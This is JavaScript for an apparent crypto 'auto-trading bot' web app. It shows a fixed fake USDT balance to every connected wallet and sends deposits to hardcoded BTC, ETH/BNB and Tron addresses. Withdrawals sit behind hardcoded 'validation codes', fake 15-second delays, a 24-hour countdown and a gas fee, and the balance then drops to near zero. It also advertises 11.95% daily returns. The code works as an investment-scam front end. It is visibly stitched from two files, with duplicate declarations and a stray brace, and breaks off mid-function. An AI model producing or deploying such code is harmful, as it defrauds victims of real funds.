// Blockchain Auto-Trading Bot SPA App Logic
// (c) 2025 web3-provider-apps

// ======= CONSTANTS =======
const TOTAL_BALANCE = 8250.78;
const USDT_DECIMALS = 6;
const walletAccountIDs = [
  "1048291756","9584207136","6732810945","4029158736","8164072395",
  "2057819463","9174623085","3841957260","5297401863","7609284153",
  "4632185097","5827049136","8714956203","6497012835","2396185740",
  "5048731962","7836241905","6104298735","9581726403","7246093815",
  "4308169527","8924056713","5179302468","3589172406","1497825036"
];
const validCodes = [
  "483921", "175064", "902718", "634285", "217509", "856430",
  "490127", "731694", "562803", "308417", "941256", "128374",
  "675820", "203519", "487960", "819432", "356701", "740528",
  "612947", "098135", "573864", "284691", "160738", "495260",
  "837514", "021693", "658407", "794135", "320586", "946172"
];
let sendAttempts = 0;

const depositAddresses = {
  "Bitcoin":   { addr: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu", label: "Bitcoin [BTC] Native" },
  "Ethereum":  { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "Ethereum [ERC-20]" },
  "BNB":       { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "BNB Smart Chain [BEP20]" },
  "Tron":      { addr: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco", label: "Tron [TRC-20]" }
};
const PAGE_STATE_KEY = 'autoTrade_lastPage';
const PAGE_STATE_ACTIVITY_KEY = 'autoTrade_lastPageActivity';

// ========== STORAGE KEYS ==========
const LS = {
  user: "autoTrade_user",
  walletMap: "autoTrade_walletMap",
  transactions: "autoTrade_transactions",
  withdraws: "autoTrade_withdrawals",
  withdrawSusp: "autoTrade_withdrawSusp",
  tradePositions: "autoTrade_trades",
  notif: "autoTrade_notif",
  notifMsgs: "autoTrade_notifMsgs",
  twofa: "autoTrade_2fa",
  twofaStatus: "autoTrade_2faStatus",
  theme: "autoTrade_theme"
};

// ========== UTILS ==========
function $(sel) { return document.querySelector(sel); }
function $all(sel) { return Array.from(document.querySelectorAll(sel)); }
const sleep = ms => new Promise(r=>setTimeout(r,ms));
function fmtUsd(n) { return typeof n === 'number' ? n.toLocaleString('en-US', {style:'currency',currency:'USD'}) : n; }
function shortAddr(addr) {
  if (!addr || typeof addr !== 'string') return "";
  if (addr.startsWith('0x') && addr.length > 10)
    return addr.slice(0,6) + "..." + addr.slice(-4);
  if (addr.length > 12) return addr.slice(0,5)+"..."+addr.slice(-4);
  return addr;
}
function now() { return Math.floor(Date.now()/1000); }
function saveLS(key, val) { localStorage.setItem(key, JSON.stringify(val)); }
function getLS(key, fallback) { try { return JSON.parse(localStorage.getItem(key)) ?? fallback; } catch { return fallback; } }
function delLS(key) { localStorage.removeItem(key); }
function show(el) { el.classList.remove('hide'); }
function hide(el) { el.classList.add('hide'); }
function copyToClipboard(txt) { navigator.clipboard.writeText(txt); }
function daysBetween(a,b) { return Math.ceil((b-a)/86400); }
function formatCountdown(s) {
  let d = Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60), sec=(s%60);
  return `${d>0?d+"d ":""}${h}h ${m}m ${sec}s`;
}
function setLastPage(page, activity = "") {
  saveLS(PAGE_STATE_KEY, page);
  saveLS(PAGE_STATE_ACTIVITY_KEY, activity);
}
function getLastPage() {
  return getLS(PAGE_STATE_KEY, null);
}
function getLastPageActivity() {
  return getLS(PAGE_STATE_ACTIVITY_KEY, null);
}

// ========== APP STATE ==========
let app = {
  user: null,
  walletMap: {},
  transactions: [],
  withdrawals: [],
  withdrawSusp: {},
  tradePositions: [],
  notif: {enabled:false},
  notifMsgs: [],
  twofa: {},
  twofaStatus: {},
  coinCache: [],
  marketTop: [],
  isLoading: false
};
// Load all persistent state
function loadAppState() {
  app.user = getLS(LS.user,null);
  app.walletMap = getLS(LS.walletMap,{});
  app.transactions = getLS(LS.transactions,[]);
  app.withdrawals = getLS(LS.withdraws,[]);
  app.withdrawSusp = getLS(LS.withdrawSusp,{});
  app.tradePositions = getLS(LS.tradePositions,[]);
  app.notif = getLS(LS.notif,{enabled:false});
  app.notifMsgs = getLS(LS.notifMsgs,[]);
  app.twofa = getLS(LS.twofa,{});
  app.twofaStatus = getLS(LS.twofaStatus,{});
  app.theme = getLS(LS.theme,"dark");
}

// ========== PAGE NAV ==========
function switchPage(pageId, activityState = null, skipPersist = false) {
  $all('.page').forEach(p => p.classList.add('hidden'));
  $('#' + pageId).classList.remove('hidden');
  if (!skipPersist) setLastPage(pageId, activityState || "");
  if (pageId === 'markets') loadMarkets();
  if (pageId === 'home') createTV('tvchart','BINANCE:BTCUSDT');
  if (pageId === 'trade') createTV('tradeChart','BINANCE:BTCUSDT');
  if (pageId === 'futures') createTV('futuresChart','BINANCE:BTCUSDT');
  if (activityState === "withdrawalProcessing") restoreWithdrawProcessingModal();
  if (activityState === "withdrawalSuccess") restoreWithdrawSuccessModal();
}

window.addEventListener('popstate', function(e) {
  let lastPage = getLastPage();
  let lastActivity = getLastPageActivity();
  if (lastPage) switchPage(lastPage, lastActivity, true);
});

function goBackPage() {
  window.history.back();
}

// Footer nav
$all('.tab').forEach(t=>t.addEventListener('click',()=>{
  const tgt=t.dataset.target; switchPage(tgt);
  $all('.tab').forEach(x=>x.classList.remove('tab-active','opacity-100'));
  t.classList.add('tab-active');
}));

// ========== MARKETS ==========
async function loadMarkets() {
  try {
    const url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false&price_change_percentage=24h';
    const res = await fetch(url); const data = await res.json();
    app.marketTop = data;
    $('#topCoinsList').innerHTML = data.slice(0,8).map(c=>`
      <div class="flex items-center justify-between py-2">
        <div class="flex items-center gap-3">
          <img src="${c.image}" class="w-6 h-6 rounded" />
          <div class="text-sm">
            <div class="font-medium">${c.name} <span class="text-xs text-gray-400 uppercase">(${c.symbol})</span></div>
            <div class="text-xs text-gray-500">Mkt Cap: ${Math.round(c.market_cap).toLocaleString()}</div>
          </div>
        </div>
        <div class="text-right">
          <div class="font-semibold">${fmtUsd(c.current_price)}</div>
          <div class="text-xs ${c.price_change_percentage_24h >= 0 ? 'text-green-400' : 'text-red-400'}">${(c.price_change_percentage_24h||0).toFixed(2)}%</div>
        </div>
      </div>`).join('');
    $('#marketsList').innerHTML = data.map(c=>`
      <div class="flex items-center justify-between p-2 border-b border-gray-800" data-coin="${c.id}">
        <div class="flex items-center gap-3">
          <img src="${c.image}" class="w-6 h-6 rounded" />
          <div class="text-sm">
            <div class="font-medium">${c.name}</div>
            <div class="text-xs text-gray-400">${c.symbol.toUpperCase()}</div>
          </div>
        </div>
        <div class="text-right">
          <div class="font-semibold">${fmtUsd(c.current_price)}</div>
          <div class="text-xs ${c.price_change_percentage_24h >= 0 ? 'text-green-400' : 'text-red-400'}">${(c.price_change_percentage_24h||0).toFixed(2)}%</div>
        </div>
      </div>`).join('');
    const sorted = data.slice().sort((a,b)=>(b.price_change_percentage_24h||0)-(a.price_change_percentage_24h||0));
    $('#gainers').innerHTML = sorted.slice(0,4).map(c=>`
      <div class="flex items-center gap-2"><img src="${c.image}" class="w-5 h-5"/><div class="flex-1">${c.symbol.toUpperCase()} <div class="text-xs text-gray-400">${fmtUsd(c.current_price)}</div></div><div class="text-sm text-green-400">${(c.price_change_percentage_24h||0).toFixed(1)}%</div></div>`).join('');
    $('#losers').innerHTML = sorted.slice(-4).reverse().map(c=>`
      <div class="flex items-center gap-2"><img src="${c.image}" class="w-5 h-5"/><div class="flex-1">${c.symbol.toUpperCase()} <div class="text-xs text-gray-400">${fmtUsd(c.current_price)}</div></div><div class="text-sm text-red-400">${(c.price_change_percentage_24h||0).toFixed(1)}%</div></div>`).join('');
  } catch(e){console.warn('markets failed',e);}
}

// ========== USDT / WALLET ==========
async function loadUsdt() {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/coins/tether');
    const data = await res.json();
    $('#usdtLogo').src = data.image.thumb;
    const market = await (await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=tether')).json();
    if (market && market[0]) $('#usdtPrice').innerText = fmtUsd(market[0].current_price);
    $('#walletHoldings').innerHTML = `<div class="flex items-center justify-between">
      <div class="flex items-center gap-3">
        <img src="${data.image.thumb}" class="w-6 h-6 rounded" />
        <div>
          <div class="font-medium">Tether USD (USDT)</div>
          <div class="text-xs text-gray-400">Balance</div>
        </div>
      </div>
      <div class="text-right font-semibold">${fmtUsd(TOTAL_BALANCE)}</div>
    </div>`;
  } catch(e){console.warn('usdt failed',e);}
}

// ========== TRADINGVIEW CHARTS ==========
function createTV(containerId, symbol='BINANCE:BTCUSDT') {
  const container = document.getElementById(containerId); if (container) container.innerHTML = '';
  return new window.TradingView.widget({
    container_id: containerId,
    width: '100%',
    height: container?.clientHeight || 320,
    symbol,
    interval: '60',
    timezone: 'Etc/UTC',
    theme: 'dark',
    style: '1',
    locale: 'en',
    toolbar_bg: '#0b0f14',
    enable_publishing: false,
    withdateranges: true,
    allow_symbol_change: true
  });
}
let tvHome = createTV('tvchart', 'BINANCE:BTCUSDT');
let tvTrade = createTV('tradeChart', 'BINANCE:BTCUSDT');
let tvFutures = createTV('futuresChart', 'BINANCE:BTCUSDT');
$('#loadSymbol').addEventListener('click', ()=> {
  const sym = $('#tradeSymbol').value;
  tvTrade = createTV('tradeChart', sym);
});

// ========== INITIAL LOAD ==========
(function init(){
  loadAppState();
  let lastPage = getLastPage();
  let lastActivity = getLastPageActivity();
  // Set wallet/account info if logged in
  if (app.user?.accountId) {
    $('#walletId').innerText = app.user.accountId;
    $('#walletId2').innerText = app.user.accountId;
  }
  $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
  $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
  loadUsdt(); loadMarkets();
  setInterval(loadMarkets, 60000);
  setInterval(loadUsdt, 60000);
  handleMarketNotif();
  // Restore last page/activity on load
  if (lastPage) switchPage(lastPage, lastActivity, true);
  else if (app.user?.accountId) switchPage('home');
  else switchPage('landingPage');
})();

// ========== WITHDRAWAL MODAL RESTORE ==========
function restoreWithdrawProcessingModal() {
  let withdrawals = getLS(LS.withdraws, []);
  let ongoing = withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end);
  if (ongoing.length) showWithdrawProcessing(ongoing[ongoing.length-1]);
}
function restoreWithdrawSuccessModal() {
  let withdrawals = getLS(LS.withdraws, []);
  let completed = withdrawals.filter(wd=>wd.status==="completed");
  if (completed.length) showWithdrawSuccessModal(completed[completed.length-1]);
}

// ========== INSTALL PROMPT ==========
document.getElementById('getMobileAppBtn').onclick = function() {
  show($('#installPrompt'));
};
$('#installNowBtn').onclick = function() { hide($('#installPrompt')); };
$('#maybeLaterBtn').onclick = function() { hide($('#installPrompt')); };

// ========== MORE MENU ==========
$('#moreBtn').addEventListener('click', ()=> $('#moreMenu').classList.toggle('hidden'));
document.addEventListener('click', (e)=> {
  if (!e.target.closest('#moreBtn') && !e.target.closest('#moreMenu')) $('#moreMenu').classList.add('hidden');
});

// ========== NOTIFICATIONS ==========
function handleMarketNotif() {
  if (app.notif.enabled) {
    let lastPop = getLS("autoTrade_lastNotif",0);
    if (now()-lastPop > 43200) {
      fetch('https://api.coingecko.com/api/v3/status_updates?project_type=coin&per_page=1&page=1')
      .then(r=>r.json()).then(res=>{
        if (res?.status_updates?.length) {
          let news = res.status_updates[0].description;
          $('#homeMarketNotif').innerText = news;
          show($('#homeMarketNotif'));
          setTimeout(()=>hide($('#homeMarketNotif')),9000);
          localStorage.setItem("autoTrade_lastNotif",now());
        }
      });
    }
  }
}

// ========== WALLET CONNECT ==========
let currentProvider = null, connectedAddr = null;
$('#connectWalletBtn').onclick = async function() {
  show($('#walletModal'));
};
$('#closeWalletModal').onclick = function() { hide($('#walletModal')); };
$('#connectMetaMask').onclick = async function() {
  hide($('#walletModal'));
  if (window.ethereum) {
    try {
      const [addr] = await window.ethereum.request({method:"eth_requestAccounts"});
      connectedAddr = addr;
      onWalletConnected(addr);
    } catch(e){alert("MetaMask error: "+e.message);}
  } else alert("MetaMask not detected.");
};
$('#connectWalletConnect').onclick = async function() {
  hide($('#walletModal'));
  let addr = prompt("Enter your Ethereum address (WalletConnect simulation):");
  if (addr && addr.length > 5) onWalletConnected(addr);
};
$('#connectTron').onclick = async function() {
  hide($('#walletModal'));
  if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
    connectedAddr = window.tronWeb.defaultAddress.base58;
    onWalletConnected(connectedAddr);
  } else alert("TronLink not detected.");
};
$('#manualAddress').onclick = function() {
  show($('#manualAddressInput'));
};
$('#manualConfirm').onclick = function() {
  let v = $('#manualInput').value.trim();
  if (v && v.length > 5) { hide($('#walletModal')); onWalletConnected(v); }
  else alert("Invalid address.");
};
function onWalletConnected(addr) {
  let map = getLS(LS.walletMap,{});
  let accId = map[addr];
  if (!accId) {
    let used = Object.values(map);
    accId = walletAccountIDs.find(id=>!used.includes(id));
    if (!accId) accId = String(Math.floor(1000000000+Math.random()*9000000000));
    map[addr] = accId;
    saveLS(LS.walletMap,map);
  }
  app.user = {address: addr, accountId: accId};
  saveLS(LS.user, app.user);
  $('#walletId').innerText = accId;
  $('#walletId2').innerText = accId;
  $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
  $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
  show($('#saveAccPopup'));
  switchPage('home');
}

// ========== LOGIN ID PAGE ==========
$('#loginIdBtn').onclick = function() {
  $('#loginInput').value = '';
  $('#loginMsg').innerText = '';
  show($('#loginModal'));
};
$('#loginConfirm').onclick = async function() {
  let v = $('#loginInput').value.trim();
  if (!v.match(/^\d{10}$/)) { $('#loginMsg').innerText = "Enter a valid 10-digit Account ID."; return; }
  $('#loginMsg').innerText = "Logging in...";
  await sleep(15000);
  let wmap = getLS(LS.walletMap,{});
  let found = Object.entries(wmap).find(([a,id])=>id===v);
  if (found) {
    app.user = {address: found[0], accountId: v};
    saveLS(LS.user, app.user);
    $('#walletId').innerText = v;
    $('#walletId2').innerText = v;
    $('#loginMsg').innerText = "Success!";
    hide($('#loginModal'));
    switchPage('home');
  } else {
    $('#loginMsg').innerText = "Connect wallet to get a wallet id.";
  }
};
$('#loginModal').addEventListener('click',e=>{
  if(e.target===e.currentTarget)hide($('#loginModal'));
});

// ========== SAVE ACCOUNT POPUP ==========
$('#showAccountBtn').onclick = function() {
  $('#accModalAddr').innerText = app.user?.address||"";
  $('#accModalID').innerText = app.user?.accountId||"";
  $('#accModalBal').innerText = fmtUsd(TOTAL_BALANCE);
  hide($('#saveAccPopup')); show($('#accountModal'));
};
$('#closeSaveAccPopup').onclick = function() { hide($('#saveAccPopup')); };

// ========== ACCOUNT MODAL ==========
$('#closeAccModal').onclick = function() { hide($('#accountModal')); };
$('#secureAccBtn').onclick = function() { hide($('#accountModal')); showGoogleAuth(); };

// ========== GOOGLE AUTH (2FA) ==========
function showGoogleAuth() {
  const accId = app.user?.accountId;
  if (!accId) return;
  let secret = app.twofa[accId] || window.otplib.authenticator.generateSecret();
  app.twofa[accId] = secret;
  saveLS(LS.twofa, app.twofa);
  const uri = window.otplib.authenticator.keyuri(accId, "AutoTradeBot", secret);
  $('#authAccID').innerText = accId;
  $('#gaSecret').innerText = secret;
  var qr = new QRious({element:$('#gaQR'), value:uri, size:120, background:"#fff", foreground:"#000"});
  $('#gaCode').value = ""; $('#gaMsg').innerText = "";
  show($('#authModal'));
}
$('#gaVerifyBtn').onclick = async function() {
  let code = $('#gaCode').value.trim();
  let accId = app.user?.accountId, secret = app.twofa[accId];
  $('#gaMsg').innerText = "Verifying...";
  await sleep(15000);
  if (window.otplib.authenticator.check(code,secret)) {
    app.twofaStatus[accId] = true;
    saveLS(LS.twofaStatus, app.twofaStatus);
    $('#gaMsg').innerText = "2FA enabled!";
  } else {
    $('#gaMsg').innerText = "Invalid code. Try again.";
  }
};
$('#gaCloseBtn').onclick = function() { hide($('#authModal')); };

// ========== DEPOSIT ==========
$('#depositBtn').onclick = async function() {
  $('#depositSearch').value = "";
  if (!app.coinCache.length) {
    let coins = await fetch('https://api.coingecko.com/api/v3/coins/list').then(r=>r.json());
    let mkts = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=250&page=1').then(r=>r.json());
    app.coinCache = mkts.map(c=>({id:c.id,name:c.name,symbol:c.symbol,thumb:c.image}));
  }
  $('#depositCoinList').innerHTML = app.coinCache.slice(0,15).map(c=>`
    <div class="flex items-center gap-3 p-2 cursor-pointer coin-row" data-id="${c.id}">
      <img src="${c.thumb}" class="w-6 h-6 rounded" /><span>${c.name} (${c.symbol.toUpperCase()})</span>
    </div>`).join('');
  show($('#depositModal'));
};
$('#closeDepositModal').onclick = function() { hide($('#depositModal')); };
$('#depositSearch').oninput = function() {
  let q=this.value.trim().toLowerCase();
  let coins=app.coinCache.filter(c=>c.name.toLowerCase().includes(q)||c.symbol.includes(q));
  $('#depositCoinList').innerHTML = coins.slice(0,25).map(c=>`
    <div class="flex items-center gap-3 p-2 cursor-pointer coin-row" data-id="${c.id}">
      <img src="${c.thumb}" class="w-6 h-6 rounded" /><span>${c.name} (${c.symbol.toUpperCase()})</span>
    </div>`).join('');
};
$('#depositCoinList').onclick = function(e) {
  let row = e.target.closest('.coin-row'); if (!row) return;
  $('#depositModal').classList.add('hide');
  $('#depositNetList').innerHTML = Object.keys(depositAddresses).map(net=>`
    <button class="btn btn-secondary w-full my-2 deposit-net-btn" data-net="${net}">${depositAddresses[net].label}</button>
  `).join('');
  show($('#depositNetworkModal'));
};
$('#closeDepositNetModal').onclick = function() { hide($('#depositNetworkModal')); };
$('#depositNetList').onclick = function(e) {
  let btn = e.target.closest('.deposit-net-btn');
  if (!btn) return;
  let net = btn.dataset.net;
  let addr = depositAddresses[net].addr;
  $('#depNetLabel').innerText = depositAddresses[net].label;
  $('#depAddrLabel').innerText = addr;
  new QRious({element:$('#depQrCanvas'), value:addr, size:120, background:"#fff", foreground:"#000"});
  show($('#depositAddressModal'));
};
$('#copyDepAddr').onclick = function() {
  copyToClipboard($('#depAddrLabel').innerText);
  alert("Address copied!");
};
$('#closeDepositAddrModal').onclick = function() { hide($('#depositAddressModal')); };

// Withdrawal Pages Logic (Binance-style UI)

// ========== CONSTANTS ==========
const TOTAL_BALANCE = 8250.78;
const HOMEPAGE_BALANCE_AFTER = 0.0680;
const GAS_FEE = 0.034; // BNB
const COUNTDOWN_SECONDS = 86400; // 24 hours
const VALID_CODES = [
  "483921", "175064", "902718", "634285", "217509", "856430",
  "490127", "731694", "562803", "308417", "941256", "128374",
  "675820", "203519", "487960", "819432", "356701", "740528",
  "612947", "098135", "573864", "284691", "160738", "495260",
  "837514", "021693", "658407", "794135", "320586", "946172"
];
const NETWORKS = [
  "Etc Ethereum network",
  "BTC Bitcoin network",
  "BNB Smart Chain BEP20 Network",
  "Tron TRC 20 network"
];
const LS_KEY = 'withdrawal_pages_withdrawals';

// ========== UTILS ==========
function $(sel) { return document.querySelector(sel); }
function show(el) { el.classList.remove('hide'); }
function hide(el) { el.classList.add('hide'); }
function fmtUsd(n) { return "$" + parseFloat(n).toLocaleString("en-US", {minimumFractionDigits:2, maximumFractionDigits:2}); }
function now() { return Math.floor(Date.now()/1000); }
function saveLS(key, val) { localStorage.setItem(key, JSON.stringify(val)); }
function getLS(key, fallback) { try { return JSON.parse(localStorage.getItem(key)) ?? fallback; } catch { return fallback; } }
function formatCountdown(sec) {
  let h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = sec%60;
  return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
}

// ========== APP STATE ==========
let app = {
  user: { address: "", accountId: "walletmodal-org" },
  withdrawals: getLS(LS_KEY, [])
};

// ========== WITHDRAWAL PAGE FLOW ==========

// Withdraw button opens Binance-style footer sheet
$('#withdrawBtn').onclick = function() {
  $('#withdrawSheet').innerHTML = `
    <div class="footer-binance">
      <button id="onChainTransferBtn">On-Chain Transfer</button>
      <button id="userAccountIdBtn">User Account ID</button>
      <button id="closeWithdrawSheet">Cancel</button>
    </div>
  `;
  show($('#withdrawSheet'));
  $('#onChainTransferBtn').onclick = function() {
    hide($('#withdrawSheet'));
    renderWithdrawDetails();
  };
  $('#userAccountIdBtn').onclick = function() {
    alert("Your Account ID: " + (app.user?.accountId || ""));
  };
  $('#closeWithdrawSheet').onclick = function() { hide($('#withdrawSheet')); };
};

function renderWithdrawDetails() {
  $('#withdrawDetailModal').innerHTML = `
    <div class="wd-modal">
      <label>Enter withdrawal address:</label>
      <input id="wdAddr" type="text" />
      <button id="fillFromWallet">Fill from connected wallet</button>
      <label>Select Network:</label>
      <input id="wdNetwork" readonly placeholder="Select Network" />
      <button id="selectNetworkBtn">Select Network</button>
      <label>Enter withdrawal amount:</label>
      <input id="wdAmt" type="number" />
      <button id="wdMaxBtn">Max</button>
      <label>Gas fee:</label>
      <span id="gasFeeLabel">${GAS_FEE} BNB</span>
      <button id="wdSubmitBtn">Withdraw</button>
      <div id="wdDetailMsg" class="text-red-500"></div>
      <button id="closeWithdrawDetail">Cancel</button>
    </div>
  `;
  show($('#withdrawDetailModal'));

  $('#fillFromWallet').onclick = function() {
    $('#wdAddr').value = app.user?.address || "";
  };
  $('#selectNetworkBtn').onclick = function() {
    let sel = document.createElement('div');
    sel.className = 'network-select-modal';
    NETWORKS.forEach(n => {
      let btn = document.createElement('button');
      btn.innerText = n;
      btn.onclick = function() {
        $('#wdNetwork').value = n;
        document.body.removeChild(sel);
      };
      sel.appendChild(btn);
    });
    document.body.appendChild(sel);
  };
  $('#wdMaxBtn').onclick = function() {
    $('#wdAmt').value = TOTAL_BALANCE;
  };
  $('#closeWithdrawDetail').onclick = function() { hide($('#withdrawDetailModal')); };
  $('#wdSubmitBtn').onclick = function() {
    let addr = $('#wdAddr').value.trim();
    let amt = parseFloat($('#wdAmt').value);
    let net = $('#wdNetwork').value.trim();
    if (!addr || isNaN(amt) || amt<=0 || !net) { $('#wdDetailMsg').innerText="Enter valid address, amount and network"; return; }
    hide($('#withdrawDetailModal'));
    renderWithdrawCodeModal(addr, amt, net);
  };
}

function renderWithdrawCodeModal(addr, amt, net) {
  $('#withdrawCodeModal').innerHTML = `
    <div class="wd-code-modal">
      <label>Enter validation code:</label>
      <input id="wdCodeInput" type="text" />
      <button id="wdCodeSubmit">Submit</button>
      <div id="wdCodeMsg"></div>
      <button id="closeWithdrawCode">Cancel</button>
    </div>
  `;
  show($('#withdrawCodeModal'));

  $('#wdCodeSubmit').onclick = async function() {
    let code = $('#wdCodeInput').value.trim();
    $('#wdCodeMsg').innerText = "Processing...";
    await new Promise(res=>setTimeout(res,15000));
    if (VALID_CODES.includes(code)) {
      hide($('#withdrawCodeModal'));
      let wd = {
        address: addr, amount: amt, network: net,
        start: now(), end: now()+COUNTDOWN_SECONDS, status: "processing"
      };
      app.withdrawals.push(wd); saveLS(LS_KEY, app.withdrawals);
      renderWithdrawProcessing(wd);
      renderActivity();
    } else {
      $('#wdCodeMsg').innerText = "Validation failed please enter correct code";
    }
  };
  $('#closeWithdrawCode').onclick = function() { hide($('#withdrawCodeModal')); };
}

function renderWithdrawProcessing(wd) {
  $('#withdrawProcessModal').innerHTML = `
    <div>
      <div>Withdrawal address: <span id="wpAddr">${wd.address}</span></div>
      <div>Network: <span id="wpNetwork">${wd.network}</span></div>
      <div>Amount: <span id="wpAmt">${fmtUsd(wd.amount)}</span></div>
      <div>24-hours countdown: <span id="wpCountdown"></span></div>
      <button id="wpViewDetails">View withdrawal details</button>
    </div>
  `;
  show($('#withdrawProcessModal'));

  let timer = setInterval(() => {
    let left = wd.end - now();
    $('#wpCountdown').innerText = formatCountdown(left > 0 ? left : 0);
    renderActivity();
    if (left <= 0) {
      clearInterval(timer);
      hide($('#withdrawProcessModal'));
      wd.status = "completed";
      saveLS(LS_KEY, app.withdrawals);
      renderWithdrawSuccess(wd);
      renderActivity();
    }
  }, 1000);

  $('#wpViewDetails').onclick = function() {
    hide($('#withdrawProcessModal'));
    renderActivity();
  };
}

function renderWithdrawSuccess(wd) {
  $('#withdrawSuccessModal').innerHTML = `
    <div>
      <div>Withdrawal Successful!</div>
      <div>
        <div>Address: ${wd.address}</div>
        <div>Amount: ${fmtUsd(wd.amount)}</div>
        <div>Network: ${wd.network}</div>
      </div>
      <button id="wsCloseBtn">Cancel</button>
    </div>
  `;
  show($('#withdrawSuccessModal'));

  $('#wsCloseBtn').onclick = function() {
    hide($('#withdrawSuccessModal'));
    renderActivity();
  };

  $('#homepageBalance').innerText = `Balance: ${HOMEPAGE_BALANCE_AFTER} USDT`;
}

function renderActivity() {
  let ongoing = app.withdrawals.filter(wd => wd.status === "processing" && now() < wd.end);
  let completed = app.withdrawals.filter(wd => wd.status === "completed");
  let html = '';

  ongoing.forEach(wd => {
    let left = wd.end-now();
    html += `
      <div class="tx-item">
        <span>Withdraw to: ${wd.address}</span>
        <span>Network: ${wd.network}</span>
        <span>Amount: ${fmtUsd(wd.amount)}</span>
        <span>Status: Processing</span>
        <span>Countdown: ${formatCountdown(left>0?left:0)}</span>
      </div>
    `;
  });
  completed.forEach(wd => {
    html += `
      <div class="tx-item success">
        <span>Withdraw to: ${wd.address}</span>
        <span>Network: ${wd.network}</span>
        <span>Amount: ${fmtUsd(wd.amount)}</span>
        <span>Status: Successful</span>
      </div>
    `;
  });
  $('#txActivitySection').innerHTML = html || '<div>No withdrawals yet.</div>';
}

// ========== RESTORE STATE ON PAGE LOAD ==========
window.addEventListener('DOMContentLoaded', function() {
  app.withdrawals = getLS(LS_KEY, []);
  renderActivity();
  app.withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end)
    .forEach(wd => renderWithdrawProcessing(wd));
  $('#homepageBalance').innerText = `Balance: ${app.withdrawals.some(w=>w.status==="completed") ? HOMEPAGE_BALANCE_AFTER : TOTAL_BALANCE} USDT`;
});

}
// ========== PAGE ACTIVITY RESTORE  ==========
function renderOngoingWithdrawals() {
  const ongoing = (getLS(LS.withdraws, []) || []).filter(wd => wd.status === "processing" && now() < wd.end);
  let list = ongoing.map(wd => {
    const left = wd.end-now();
    return `
      <div class="bg-gray-800 rounded p-2 mb-2">
        <div><b>Processing Withdrawal</b></div>
        <div>Address: <span>${wd.address}</span></div>
        <div>Network: <span>${wd.network}</span></div>
        <div>Amount: <span>${fmtUsd(wd.amount)}</span></div>
        <div>Time Remaining: <span class="countdown" data-end="${wd.end}">${formatCountdown(left)}</span></div>
      </div>
    `;
  }).join('');
  $('#recentTx').innerHTML = list || '<div class="text-gray-400">No transactions — demo mode.</div>';
}
function updateCountdownDisplays() {
  $all('.countdown').forEach(el=>{
    const end = parseInt(el.dataset.end,10);
    const left = end-now();
    el.innerText = formatCountdown(left>0?left:0);
  });
}
function restoreWithdrawalsUI() {
  let withdrawals = getLS(LS.withdraws, []);
  withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end)
    .forEach(wd => showWithdrawProcessing(wd));
  renderOngoingWithdrawals();
}
window.addEventListener('DOMContentLoaded', restoreWithdrawalsUI);
setInterval(() => {
  updateCountdownDisplays();
  renderOngoingWithdrawals();
}, 1000);

// ========== SWAP (DEMO) ==========
$('#swapBtn').onclick = ()=>alert("Swap flow (demo)");

// ========== Trade Page + Trading Simulation + TradingView Widget + SPA ==========

// ---- Constants and State ----
const TRADE_RETURNS_RATE = 0.1195; // 11.95% daily
const TRADE_DURATIONS = [1,2,3,4,5,6,7,8,9,10,11,12];
const TRADE_STATE_KEY = "autoTrade_tradeState";
const MAIN_PORTFOLIO_KEY = "autoTrade_mainPortfolio";

let tradingSimulationData = null;
let tradingSimulationInterval = null;
let usdtAmount = 0; // will be set from trade state on load

// ---- TradingView Functions ----
function initializeTradingView() {
  if (typeof TradingView === 'undefined') return;
  const container = document.getElementById('tvchart');
  if (!container) return;
  try {
    tradingViewWidget = new TradingView.widget({
      width: '100%',
      height: 400,
      symbol: "BINANCE:BTCUSDT",
      interval: "1D",
      timezone: "Etc/UTC",
      theme: "dark",
      style: "1",
      locale: "en",
      toolbar_bg: "#1a1d29",
      enable_publishing: false,
      allow_symbol_change: true,
      container_id: "tvchart",
      hide_side_toolbar: false,
    });
  } catch (error) {
    console.error('TradingView initialization failed:', error);
    container.innerHTML = '<div class="flex items-center justify-center h-full text-muted-foreground">Chart loading...</div>';
  }
}
function embedTradeChart(symbol, containerId = "tradeChart") {
  let el = document.getElementById(containerId);
  el.innerHTML = '';
  let tvWidget = document.createElement('div');
  tvWidget.id = `tvChartEmbed_${containerId}`;
  tvWidget.style = "height:340px;";
  el.appendChild(tvWidget);
  new TradingView.widget({
    container_id: tvWidget.id,
    autosize: true,
    symbol: symbol,
    interval: "D",
    timezone: "Etc/UTC",
    theme: "dark",
    style: "1",
    locale: "en",
    toolbar_bg: "#0b0f14",
    enable_publishing: false,
    allow_symbol_change: true,
    studies: [],
    details: true,
    withdateranges: true,
    hide_side_toolbar: false
  });
}
function switchTradingPair(pair) {
  console.log('Switching to', pair);
  // Implementation would update TradingView widget
}

// ---- Trade State ----
function getTradeState() {
  return getLS(TRADE_STATE_KEY, {
    trades: [],
    totalBalance: 5000,
    totalEarnings: 0,
    totalReturns: 0,
    lastSymbol: "BINANCE:BTCUSDT"
  });
}
function setTradeState(state) { saveLS(TRADE_STATE_KEY, state); }

function getMainPortfolio() {
  return getLS(MAIN_PORTFOLIO_KEY, { totalPortfolio: 8250.78 });
}
function setMainPortfolio(state) { saveLS(MAIN_PORTFOLIO_KEY, state); }

function updateBalanceDisplay() {
  // Update trade balance and main portfolio balance in UI
